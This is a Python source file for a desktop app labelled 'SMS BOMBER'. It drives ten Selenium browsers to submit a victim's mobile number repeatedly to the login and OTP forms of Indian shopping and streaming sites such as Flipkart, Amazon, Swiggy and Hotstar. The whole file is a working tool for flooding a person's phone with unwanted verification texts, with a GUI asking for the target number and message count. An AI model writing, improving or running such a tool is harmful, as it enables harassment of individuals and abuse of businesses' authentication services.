from threading import TIMEOUT_MAX
from selenium import webdriver
import time
from turtle import onrelease
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.pagelayout import PageLayout
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.screenmanager import Screen,ScreenManager
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.lang.builder import Builder
from kivy.core.window import Window
from kivy.uix.dropdown import DropDown
from kivy.uix.spinner import Spinner
from kivy.uix.image import Image 
from kivy.uix.widget import Widget

Window.clearcolor = (1,1,1,1)


Reddish = (0.588, 0.141, 0.949)


time_interval = 0.1
websites = 10






def flipkart(mob_number):
    
    browser_flipkart.get('https://www.flipkart.com/account/login?ret=/')

    number_f = browser_flipkart.find_element("xpath", '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')
    number_f.send_keys(mob_number)

    
    forgot = browser_flipkart.find_element("xpath", '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[2]/a')
    forgot.click()

    time.sleep(time_interval)
def swiggy(mob_number):
    browser_swiggy.get('https://www.swiggy.com')


    page_swiggy = browser_swiggy.find_element("xpath", '//*[@id="root"]/div[1]/div[1]/div/div[1]/div[1]/div/div[1]/div/a[1]')
    page_swiggy.click()

    number_s = browser_swiggy.find_element("xpath", '//*[@id="mobile"]')

    number_s.send_keys(mob_number)
        
    login = browser_swiggy.find_element("xpath", '//*[@id="overlay-sidebar-root"]/div/div/div[2]/div/div/div/form/div[2]/a')
    login.click()
        
    time.sleep(time_interval)   
def naaptol(mob_number):
    browser_naaptol.get('https://www.naaptol.com/')


    page_naaptol = browser_naaptol.find_element("xpath", '//*[@id="login-panel-link"]')
    page_naaptol.click()

    number_n = browser_naaptol.find_element("xpath", '//*[@id="registration-basic-panel-mobile"]')

    number_n.send_keys(mob_number)
        
    login = browser_naaptol.find_element("xpath", '//*[@id="registration-basic-panel-submit"]')
    login.click()
        
    time.sleep(time_interval)
def amazon(mob_number):
    
    browser_amazon.get('https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F%26linkCode%3Dll2%26tag%3Doperagx-desktop-in-21%26linkId%3Df9dfa554c004a3f025d93f062dec5ec6%26language%3Den_IN%26ref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&')

    number_a = browser_amazon.find_element("xpath", '//*[@id="ap_email"]')
    number_a.send_keys(mob_number)

    time.sleep(0.1)
    forgot = browser_amazon.find_element("xpath", '//*[@id="continue"]')
    forgot.click()

    time.sleep(time_interval)
def md_computers(mob_number):
    
    browser_md_computers.get('https://mdcomputers.in/')
    
    page_md_computers = browser_md_computers.find_element("xpath", '//*[@id="TabBlock-1"]/ul/li[1]/a')
    page_md_computers.click()

    number_md = browser_md_computers.find_element("xpath", '//*[@id="email"]')

    number_md.send_keys(mob_number)
        
    login = browser_md_computers.find_element("xpath", '//*[@id="requestOtp"]')
    login.click()
        
    time.sleep(time_interval)   
def meesho(mob_number):
    
    browser_meesho.get('https://www.meesho.com/auth?redirect=https%3A%2F%2Fwww.meesho.com%2F&source=profile&entry=header&screen=HP')
    number_mee = browser_meesho.find_element("xpath", '//*[@id="ap_email"]')
    number_mee.send_keys(mob_number)

    time.sleep(0.1)
    forgot = browser_meesho.find_element("xpath", '//*[@id="__next"]/div[4]/div/div[2]/div/button/div')
    forgot.click()

    time.sleep(time_interval)
def olx(mob_number):
    
    browser_olx.get('https://www.olx.in/')

    login = browser_olx.find_element("xpath", '//*[@id="container"]/header/div/div/div[4]/button')
    login.click()

    extra = browser_olx.find_element("xpath", '/html/body/div[3]/div/div/div/button[1]')
    extra.click()
    number_olx = browser_olx.find_element("xpath", '//*[@id="phone"]')
    number_olx.send_keys(mob_number)

    
    forgot = browser_olx.find_element("xpath", '/html/body/div[3]/div/div/form/div/button')
    forgot.click()

    time.sleep(time_interval)
def bewakoof(mob_number):
    
    browser_bewakoof.get('https://www.bewakoof.com/login')
    number_bewa = browser_bewakoof.find_element("xpath", '//*[@id="mobile_number"]')
    number_bewa.send_keys(mob_number)

    
    forgot = browser_bewakoof.find_element("xpath", '//*[@id="web_continue_submit"]')
    forgot.click()

    time.sleep(time_interval)
def nykaa(mob_number):
    
    browser_nykaa.get('https://www.nykaafashion.com/authorization?authPage=login-mobile-orders&redirectURL=https%3A%2F%2Fwww.nykaafashion.com%2Fsales%2Forder%2Fhistory')


    number_ny = browser_nykaa.find_element("xpath", '//*[@id="app"]/section/form/section/div/div/div/input')
    number_ny.send_keys(mob_number)

    
    forgot = browser_nykaa.find_element("xpath", '//*[@id="app"]/section/form/div/button')
    forgot.click()

    time.sleep(time_interval)
def hotstar(mob_number):
    
    browser_hotstar.get('https://www.hotstar.com/in')

    login = browser_hotstar.find_element("xpath", '//*[@id="app"]/div/div/div[1]/div[1]/div/div[2]/div/div[5]/div')
    login.click()

    number_hot = browser_hotstar.find_element("xpath", '//*[@id="phoneNo"]')
    number_hot.send_keys(mob_number)

    
    forgot = browser_hotstar.find_element("xpath", '//*[@id="app"]/div/div/div[1]/div[3]/div/div/div[1]/div/div[2]/div/div[1]/div/div/div[3]/button')
    forgot.click()

    time.sleep(time_interval)

def browser_quit(self,obj):
    browser_flipkart.quit()
    browser_swiggy.quit()
    browser_naaptol.quit()
    browser_amazon.quit()
    browser_md_computers.quit()
    browser_meesho.quit()
    browser_olx.quit()
    browser_bewakoof.quit()
    browser_nykaa.quit()
    browser_hotstar.quit()



class Bomber_sms(App):


    def build(self):

        float_layout = FloatLayout()

        self.top_label = Label(text ='SMS BOMBER',
            pos_hint={'center_x':0.47,'center_y':0.9},
            color=Reddish,
            bold = True,
            font_size ='50px'
        )

        self.number = Label(text ='Enter Mobile Number ',
            pos_hint={'center_x':0.25,'center_y':0.6},
            color=Reddish,
            bold = True,
            font_size ='30px'
        )

        self.num_messages = Label(text ='Enter Number Of Messages',
            pos_hint={'center_x':0.3,'center_y':0.5},
            color=Reddish,
            bold = True,
            font_size ='30px'
        )
        self.mobile_number = TextInput(text='',
            pos_hint={'center_x':0.7,'center_y':0.57},
            size_hint= (0.3,0.1),
            background_active = "E:\\Editing\\textbox.png",
            background_normal = "E:\\Editing\\textbox.png",      
       
        )
        self.number_messages = TextInput(text='',
            pos_hint={'center_x':0.7,'center_y':0.47},
            size_hint= (0.3,0.1),   
            background_active = "E:\\Editing\\textbox.png",
            background_normal = "E:\\Editing\\textbox.png",      
       
        )
        
        self.submit  = Button(
            text = 'Submit',
            on_press = self.browser_manual_open,             
            pos_hint={'center_x':0.53,'center_y':0.3}, 
            size_hint= (0.3,0.1),
            background_color =Reddish
        )
        self.manual_quit  = Button(
            text = 'Close Browsers',
            on_press= self.browser_quit,
            pos_hint={'center_x':0.3,'center_y':0.15}, 
            size_hint= (0.3,0.1),
            background_color =Reddish
        )
        self.manual_open  = Button(
            text = 'Open Browsers',
            on_press = self.browser_manual_re_open,
            pos_hint={'center_x':0.7,'center_y':0.15}, 
            size_hint= (0.3,0.1),
            background_color =Reddish
        )
        
        float_layout.add_widget(self.top_label)
        float_layout.add_widget(self.number)
        float_layout.add_widget(self.num_messages)
        float_layout.add_widget(self.mobile_number)
        float_layout.add_widget(self.number_messages)
        float_layout.add_widget(self.submit)
        float_layout.add_widget(self.manual_quit)
        float_layout.add_widget(self.manual_open)

        return float_layout

    def sleep_manual(self,obj):
        time.sleep(10)

 
    def browser_quit(self,obj):
        browser_flipkart.quit()
        browser_swiggy.quit()
        browser_naaptol.quit()
        browser_amazon.quit()
        browser_md_computers.quit()
        browser_meesho.quit()
        browser_olx.quit()
        browser_bewakoof.quit()
        browser_nykaa.quit()
        browser_hotstar.quit()

    def browser_manual_open(self,obj):
	
	    
		
       
        global browser_flipkart , browser_swiggy, browser_naaptol, browser_amazon, browser_md_computers, browser_meesho, browser_olx, browser_bewakoof, browser_nykaa, browser_hotstar
        
        try:
            self.initiate_bombing(12)
        except:
            pass
        
        browser_flipkart = webdriver.Edge('msedgedriver.exe')        
        browser_swiggy = webdriver.Edge('msedgedriver.exe')        
        browser_naaptol = webdriver.Edge('msedgedriver.exe')       
        browser_amazon = webdriver.Edge('msedgedriver.exe')       
        browser_md_computers = webdriver.Edge('msedgedriver.exe')      
        browser_meesho = webdriver.Edge('msedgedriver.exe')    
        browser_olx = webdriver.Edge('msedgedriver.exe')     
        browser_bewakoof = webdriver.Edge('msedgedriver.exe')
        browser_nykaa = webdriver.Edge('msedgedriver.exe')
        browser_hotstar = webdriver.Edge('msedgedriver.exe')
        print("Start---------------------------------------")
        
        
        self.initiate_bombing(12)

        self.browser_quit(12)
        
    def browser_manual_re_open(self,obj):

       
           
        global browser_flipkart , browser_swiggy, browser_naaptol, browser_amazon, browser_md_computers, browser_meesho, browser_olx, browser_bewakoof, browser_nykaa, browser_hotstar
        browser_flipkart.quit()
        browser_flipkart = webdriver.Edge('msedgedriver.exe')
        browser_swiggy.quit()
        browser_swiggy = webdriver.Edge('msedgedriver.exe')
        browser_naaptol.quit()
        browser_naaptol = webdriver.Edge('msedgedriver.exe')
        browser_amazon.quit()
        browser_amazon = webdriver.Edge('msedgedriver.exe')
        browser_md_computers.quit()
        browser_md_computers = webdriver.Edge('msedgedriver.exe')
        browser_meesho.quit()
        browser_meesho = webdriver.Edge('msedgedriver.exe')
        browser_olx.quit()
        browser_olx = webdriver.Edge('msedgedriver.exe')
        browser_bewakoof.quit()
        browser_bewakoof = webdriver.Edge('msedgedriver.exe')
        browser_nykaa.quit()
        browser_nykaa = webdriver.Edge('msedgedriver.exe')
        browser_hotstar.quit()
        browser_hotstar = webdriver.Edge('msedgedriver.exe')
        

    def initiate_bombing(self,obj):
        
        mob_number = self.mobile_number.text
        num_of_messages = round((int(self.number_messages.text)) / websites)
        for i in range(num_of_messages):

            
            try:
                flipkart(mob_number)     
            except: 
                pass
            try:
                swiggy(mob_number)      
            except: 
                pass
            try:
                naaptol(mob_number)    
            except: 
                pass
            try:
                amazon(mob_number)     
            except: 
                pass
            try:
                md_computers(mob_number)
            except: 
                pass
            try:
                meesho(mob_number)    
            except: 
                pass
            try:
                olx(mob_number)
            except: 
                pass
            try:
                bewakoof(mob_number)                
            except: 
                pass
            try:
                nykaa(mob_number)     
            except: 
                pass
            try:
                hotstar(mob_number)  
            except: 
                pass
            
        


if __name__ =="__main__":
    Bomber_sms().run()
    